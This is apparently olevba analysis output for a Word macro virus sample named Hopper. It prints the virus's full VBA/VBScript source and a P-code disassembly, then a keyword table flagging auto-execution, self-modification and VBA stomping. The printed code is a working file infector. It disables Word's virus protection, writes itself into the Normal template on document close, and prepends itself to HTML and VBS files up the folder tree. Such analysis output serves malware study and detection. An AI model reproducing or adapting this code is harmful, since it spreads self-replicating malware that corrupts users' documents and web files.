olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Hopper.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Hopper.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: ./Virus.MSOffice.Hopper.q - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль2.bas 
in file: ./Virus.MSOffice.Hopper.q - OLE stream: 'Macros/VBA/Модуль2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль3.bas 
in file: ./Virus.MSOffice.Hopper.q - OLE stream: 'Macros/VBA/Модуль3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html><!--kiss-->
'<BODY>
'<script language="VBScript"><!--

Private FSO, NT, InfType, HostPath, Target, NextLine, TempFile

'Private Sub WscriptCode
   On Error Resume Next
   HostType = 3
   HostPath = Wscript.ScriptFullName
   Call GotoWord
   Call FindHTMVBS
'End Sub

Private Sub Window_Onload()
   Dim FSO, CurrentPath, folder, fc, f1
   If location.protocol = "file:" Then
      Set FSO = CreateObject("Scripting.FileSystemObject")
      HostPath = Replace(location.href, "file:///", "")
      HostPath = Replace(HostPath, "/", "\")
      HostType = 2
      Call GotoWord
      Call FindHTMVBS
   End If
End Sub

Private Sub GotoWord()
   Set WordObj = CreateObject("Word.Application")
   Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
   If NT.Lines(1, 1) <> "'<html><!--kiss-->" Then
      WordObj.Options.SaveNormalPrompt = False
      NT.DeleteLines 1, NT.CountOfLines
      NT.Addfromfile HostPath
      NT.DeleteLines 156, (NT.CountOfLines - 155)
      If HostType = 2 Then
         For j = 1 To 3
            NT.ReplaceLine j, "'" + NT.Lines(j, 1)
         Next
         For j = 153 To 155
            NT.ReplaceLine j, "'" + NT.Lines(j, 1)
            Next
      Else
         NT.ReplaceLine 7, Mid(NT.Lines(7, 1), 2)
         NT.ReplaceLine 13, Mid(NT.Lines(13, 1), 2)
      End If
   End If
   Set NT = Nothing
   WordObj.Quit
End Sub

Private Sub FindHTMVBS()
   Set FSO = CreateObject("Scripting.FileSystemObject")
   CurrentPath = FSO.GetParentFolderName(HostPath)
   Set folder = FSO.GetFolder(cpath)
   While folder.IsRootFolder = False
      Set folder = FSO.GetFolder(CurrentPath)
      Set fc = folder.Files
      cpath = FSO.GetParentFolderName(CurrentPath)
      For Each Target In fc
         InfExt = Lcase(FSO.GetExtensionName(Target.name)) = "html"
         If (InfExt = "html" Or InfExt = "htm" Or InfExt = "vbs") And Target.path <> HostName Then
            Set fh = FSO.opentextfile(Target.path, 1, True)
            TestString = fh.ReadLine
            fh.close
            If TestString <> "<html><!--kiss-->" And TestString <> "'<html><!--kiss-->" Then
               TempFile = FSO.GetTempName
               FSO.CopyFile Target.path, TempFile
               Set ft = FSO.opentextfile(Target.path, 2, True)
               If HostType = 1 Then
                  For j = 1 To 155
                      NextLine = NT.Lines(j, 1)
                      Call CheckLine(j)
                      ft.WriteLine NextLine
                  Next
               Else
                  Set fh = FSO.opentextfile(HostPath, 1, True)
                  For j = 1 To 155
                      NextLine = fh.ReadLine
                      Call CheckLine(j)
                      ft.WriteLine NextLine
                  Next
                  fh.close
               End If
               ft.close
               Set fh = FSO.opentextfile(TempFile, 1, True)
               Set ft = FSO.opentextfile(Target.path, 8, True)
               Do While fh.AtEndOfStream <> True
                  ft.WriteLine fh.ReadLine
               Loop
               ft.close
               fh.close
               FSO.DeleteFile TempFile
            End If
         End If
      Next
   Wend
End Sub

Private Sub CheckLine(LineNumber)
   If HostType = 1 Then
      If InfType = "htm" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = Mid(NextLine, 2)
         End If
      Else
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = "'" + NextLine
         End If
      End If
   ElseIf HostType = 2 Then
      If InfType = "vbs" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = "'" + NextLine
         End If
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = "'" + NextLine
         End If
      End If
   Else
      If InfType = "htm" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = Mid(NextLine, 2)
         End If
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = Mid(NextLine, 2)
         End If
      End If
   End If
End Sub

Private Sub Document_Close()
   On Error Resume Next
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   If NT.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         NT.InsertLines i, AD.Lines(i, 1)
      Next
   End If
   If AD.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         AD.InsertLines i, NT.Lines(i, 1)
      Next
   End If
   HostType = 1
   HostPath = "C:\Windows\Web\Afile.htm"
   Call FindHTMVBS
End Sub

'--></script>
'</BODY>
'</HTML>
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Hopper.q
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Модуль1 - 6057 bytes
' Macros/VBA/Модуль2 - 789 bytes
' Line #0:
' Macros/VBA/Модуль3 - 8151 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0011 "<html><!--kiss-->"
' Line #1:
' 	QuoteRem 0x0000 0x0006 "<BODY>"
' Line #2:
' 	QuoteRem 0x0000 0x0020 "<script language="VBScript"><!--"
' Line #3:
' Line #4:
' 	Dim (Private) 
' 	VarDefn FSO
' 	VarDefn NT
' 	VarDefn InfType
' 	VarDefn HostPath
' 	VarDefn Target
' 	VarDefn NextLine
' 	VarDefn TempFile
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0017 "Private Sub WscriptCode"
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitDI2 0x0003 
' 	St HostType 
' Line #9:
' 	Ld Wscript 
' 	MemLd ScriptFullName 
' 	St HostPath 
' Line #10:
' 	ArgsCall (Call) GotoWord 0x0000 
' Line #11:
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' Line #12:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub Window_Onload())
' Line #15:
' 	Dim 
' 	VarDefn FSO
' 	VarDefn CurrentPath
' 	VarDefn folder
' 	VarDefn fc
' 	VarDefn f1
' Line #16:
' 	Ld location 
' 	MemLd protocol 
' 	LitStr 0x0005 "file:"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #18:
' 	Ld location 
' 	MemLd href 
' 	LitStr 0x0008 "file:///"
' 	LitStr 0x0000 ""
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #19:
' 	Ld HostPath 
' 	LitStr 0x0001 "/"
' 	LitStr 0x0001 "\"
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #20:
' 	LitDI2 0x0002 
' 	St HostType 
' Line #21:
' 	ArgsCall (Call) GotoWord 0x0000 
' Line #22:
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Private Sub GotoWord())
' Line #27:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #28:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordObj 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #29:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'<html><!--kiss-->"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #32:
' 	Ld HostPath 
' 	Ld NT 
' 	ArgsMemCall Addfromfile 0x0001 
' Line #33:
' 	LitDI2 0x009C 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	LitDI2 0x009B 
' 	Sub 
' 	Paren 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #34:
' 	Ld HostType 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #36:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0099 
' 	LitDI2 0x009B 
' 	For 
' Line #39:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	ElseBlock 
' Line #42:
' 	LitDI2 0x0007 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #43:
' 	LitDI2 0x000D 
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #47:
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub FindHTMVBS())
' Line #51:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #52:
' 	Ld HostPath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St CurrentPath 
' Line #53:
' 	SetStmt 
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #54:
' 	Ld folder 
' 	MemLd IsRootFolder 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #55:
' 	SetStmt 
' 	Ld CurrentPath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #56:
' 	SetStmt 
' 	Ld folder 
' 	MemLd Files 
' 	Set fc 
' Line #57:
' 	Ld CurrentPath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St cpath 
' Line #58:
' 	StartForVariable 
' 	Ld Target 
' 	EndForVariable 
' 	Ld fc 
' 	ForEach 
' Line #59:
' 	Ld Target 
' 	MemLd New 
' 	Ld FSO 
' 	ArgsMemLd GetExtensionName 0x0001 
' 	ArgsLd Lcase 0x0001 
' 	LitStr 0x0004 "html"
' 	Eq 
' 	St InfExt 
' Line #60:
' 	Ld InfExt 
' 	LitStr 0x0004 "html"
' 	Eq 
' 	Ld InfExt 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	Or 
' 	Ld InfExt 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Target 
' 	MemLd path 
' 	Ld HostName 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #61:
' 	SetStmt 
' 	Ld Target 
' 	MemLd path 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #62:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St TestString 
' Line #63:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #64:
' 	Ld TestString 
' 	LitStr 0x0011 "<html><!--kiss-->"
' 	Ne 
' 	Ld TestString 
' 	LitStr 0x0012 "'<html><!--kiss-->"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #65:
' 	Ld FSO 
' 	MemLd GetTempName 
' 	St TempFile 
' Line #66:
' 	Ld Target 
' 	MemLd path 
' 	Ld TempFile 
' 	Ld FSO 
' 	ArgsMemCall CopyFile 0x0002 
' Line #67:
' 	SetStmt 
' 	Ld Target 
' 	MemLd path 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #68:
' 	Ld HostType 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x009B 
' 	For 
' Line #70:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	St NextLine 
' Line #71:
' 	Ld j 
' 	ArgsCall (Call) CheckLine 0x0001 
' Line #72:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #73:
' 	StartForVariable 
' 	Next 
' Line #74:
' 	ElseBlock 
' Line #75:
' 	SetStmt 
' 	Ld HostPath 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #76:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x009B 
' 	For 
' Line #77:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St NextLine 
' Line #78:
' 	Ld j 
' 	ArgsCall (Call) CheckLine 0x0001 
' Line #79:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #84:
' 	SetStmt 
' 	Ld TempFile 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #85:
' 	SetStmt 
' 	Ld Target 
' 	MemLd path 
' 	LitDI2 0x0008 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #86:
' 	Ld fh 
' 	MemLd AtEndOfStream 
' 	LitVarSpecial (True)
' 	Ne 
' 	DoWhile 
' Line #87:
' 	Ld fh 
' 	MemLd ReadLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #88:
' 	Loop 
' Line #89:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #90:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #91:
' 	Ld TempFile 
' 	Ld FSO 
' 	ArgsMemCall DeleteFile 0x0001 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	StartForVariable 
' 	Next 
' Line #95:
' 	Wend 
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Private Sub CheckLine(LineNumber))
' Line #99:
' 	Ld HostType 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #100:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #101:
' 	Ld LineNumber 
' 	LitDI2 0x0004 
' 	Lt 
' 	Ld LineNumber 
' 	LitDI2 0x0098 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #102:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	ElseBlock 
' Line #105:
' 	Ld LineNumber 
' 	LitDI2 0x0007 
' 	Eq 
' 	Ld LineNumber 
' 	LitDI2 0x000D 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #106:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Ld HostType 
' 	LitDI2 0x0002 
' 	Eq 
' 	ElseIfBlock 
' Line #110:
' 	Ld InfType 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	IfBlock 
' Line #111:
' 	Ld LineNumber 
' 	LitDI2 0x0004 
' 	Lt 
' 	Ld LineNumber 
' 	LitDI2 0x0098 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #112:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	Ld LineNumber 
' 	LitDI2 0x0007 
' 	Eq 
' 	Ld LineNumber 
' 	LitDI2 0x000D 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #115:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	ElseBlock 
' Line #119:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #120:
' 	Ld LineNumber 
' 	LitDI2 0x0004 
' 	Lt 
' 	Ld LineNumber 
' 	LitDI2 0x0098 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #121:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	Ld LineNumber 
' 	LitDI2 0x0007 
' 	Eq 
' 	Ld LineNumber 
' 	LitDI2 0x000D 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #124:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndSub 
' Line #129:
' Line #130:
' 	FuncDefn (Private Sub Document_Close())
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #133:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #134:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #135:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #136:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #137:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'<html><!--kiss-->"
' 	Ne 
' 	IfBlock 
' Line #138:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x009B 
' 	For 
' Line #139:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #140:
' 	StartForVariable 
' 	Next 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'<html><!--kiss-->"
' 	Ne 
' 	IfBlock 
' Line #143:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x009B 
' 	For 
' Line #144:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #145:
' 	StartForVariable 
' 	Next 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	LitDI2 0x0001 
' 	St HostType 
' Line #148:
' 	LitStr 0x0018 "C:\Windows\Web\Afile.htm"
' 	St HostPath 
' Line #149:
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' Line #152:
' 	QuoteRem 0x0000 0x000C "--></script>"
' Line #153:
' 	QuoteRem 0x0000 0x0007 "</BODY>"
' Line #154:
' 	QuoteRem 0x0000 0x0007 "</HTML>"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

